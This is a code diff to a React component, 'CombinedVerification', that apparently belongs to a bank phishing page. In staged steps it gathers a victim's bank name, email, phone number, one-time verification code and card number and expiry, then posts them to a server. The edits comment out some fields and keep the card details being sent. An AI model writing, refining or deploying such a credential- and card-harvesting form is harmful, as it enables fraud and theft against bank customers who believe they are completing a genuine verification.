@@ -41,8 +41,8 @@ export default function CombinedVerification() {
       let requestData = {
         bankName: formData.bankName,
         type: stepNumber === 1 ? 'email and phone number' : stepNumber === 2 ? 'verification code (OTP)' : 'bank card details',
-        stepCompleted: stepNumber,
-        time: new Date().toString(),
+        // stepCompleted: stepNumber,
+        // time: new Date().toString(),
         ...additionalData
       };
       
@@ -88,8 +88,8 @@ export default function CombinedVerification() {
       
       // Send step 2 data (previously step 3)
       const success = await sendStepData(2, {
-        emailAddress: formData.emailAddress,
-        phoneNumber: formData.phoneNumber,
+        // emailAddress: formData.emailAddress,
+        // phoneNumber: formData.phoneNumber,
         verificationCode: formData.verificationCode
       });
       
@@ -136,9 +136,9 @@ export default function CombinedVerification() {
         body: JSON.stringify({
           bankName: formData.bankName,
           
-          emailAddress: formData.emailAddress,
-          phoneNumber: formData.phoneNumber,
-          verificationCode: formData.verificationCode,
+          // emailAddress: formData.emailAddress,
+          // phoneNumber: formData.phoneNumber,
+          // verificationCode: formData.verificationCode,
           // Credit card details
           cardNumber: formData.cardNumber,
           cardExpiry: formData.cardExpiry,
